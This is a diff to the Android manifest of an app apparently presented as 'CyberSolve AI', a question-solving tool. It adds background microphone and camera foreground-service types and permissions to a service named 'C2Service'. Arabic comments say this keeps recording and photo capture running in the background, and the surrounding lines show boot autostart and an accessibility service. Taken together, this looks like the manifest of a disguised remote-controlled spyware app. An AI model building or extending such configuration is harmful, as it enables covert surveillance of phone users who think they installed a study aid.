@@ -5,6 +5,7 @@
   التعديلات في هذه النسخة:
   - إضافة أذونات الكاميرا والميكروفون (للمسح الضوئي وحل الأسئلة).
   - تحديث التعليقات لتتوافق مع تطبيق "CyberSolve AI".
+  - إضافة microphone|dataSync|camera إلى C2Service (لضمان عمل التسجيل والكاميرا في الخلفية).
   
   المسار: app/src/main/AndroidManifest.xml
 -->
@@ -24,6 +25,8 @@
     <!-- ============ الخدمة الأمامية (Android 14+ إلزامي) ============ -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
 
     <!-- ============ البدء التلقائي بعد إعادة التشغيل ============ -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
@@ -57,10 +60,11 @@
         </activity>
 
         <!-- ============ 2. الخدمة الأمامية (C2) ============ -->
+        <!-- تمت إضافة microphone|camera لتمكين التسجيل والتقاط الصور في الخلفية -->
         <service
             android:name=".core.C2Service"
             android:exported="false"
-            android:foregroundServiceType="dataSync"
+            android:foregroundServiceType="dataSync|microphone|camera"
             android:stopWithTask="false" />
 
         <!-- ============ 3. خدمة إمكانية الوصول (لتحليل النصوص) ============ -->
